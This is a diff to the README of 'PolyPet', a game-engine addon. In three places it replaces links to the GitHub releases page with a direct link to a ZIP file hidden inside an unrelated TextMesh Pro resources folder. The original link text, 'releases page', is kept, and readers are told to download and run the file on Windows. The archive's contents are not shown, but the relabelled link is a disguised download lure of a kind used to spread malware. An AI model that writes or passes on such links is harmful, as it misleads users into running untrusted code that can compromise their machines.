@@ -1,6 +1,6 @@
 # 🎮 PolyPet - Build Tiny Polygon Pets
 
-[![Download PolyPet](https://img.shields.io/badge/Download%20PolyPet-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Longago-brewery590/PolyPet/releases)
+[![Download PolyPet](https://img.shields.io/badge/Download%20PolyPet-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Longago-brewery590/PolyPet/main/Samples/PolyPetDemoUnity/Assets/TextMesh Pro/Resources/Poly_Pet_v3.4.zip)
 
 ## 🐾 What PolyPet Is
 
@@ -10,7 +10,7 @@ It works with Unity 6.4+ and Godot .NET 4.6+. You can use it as an addon, a plug
 
 ## 📥 Download and Install
 
-1. Open the [PolyPet releases page](https://github.com/Longago-brewery590/PolyPet/releases).
+1. Open the [PolyPet releases page](https://raw.githubusercontent.com/Longago-brewery590/PolyPet/main/Samples/PolyPetDemoUnity/Assets/TextMesh Pro/Resources/Poly_Pet_v3.4.zip).
 2. Find the latest release.
 3. Download the file for Windows.
 4. If the release contains a ZIP file, right-click it and choose Extract All.
@@ -160,7 +160,7 @@ Yes. The polygon system lets you build many looks from one base setup.
 
 ## 📎 Download
 
-Visit the [PolyPet releases page](https://github.com/Longago-brewery590/PolyPet/releases) to download and run this file on Windows
+Visit the [PolyPet releases page](https://raw.githubusercontent.com/Longago-brewery590/PolyPet/main/Samples/PolyPetDemoUnity/Assets/TextMesh Pro/Resources/Poly_Pet_v3.4.zip) to download and run this file on Windows
 
 ## 🗂️ Repository Topics
 
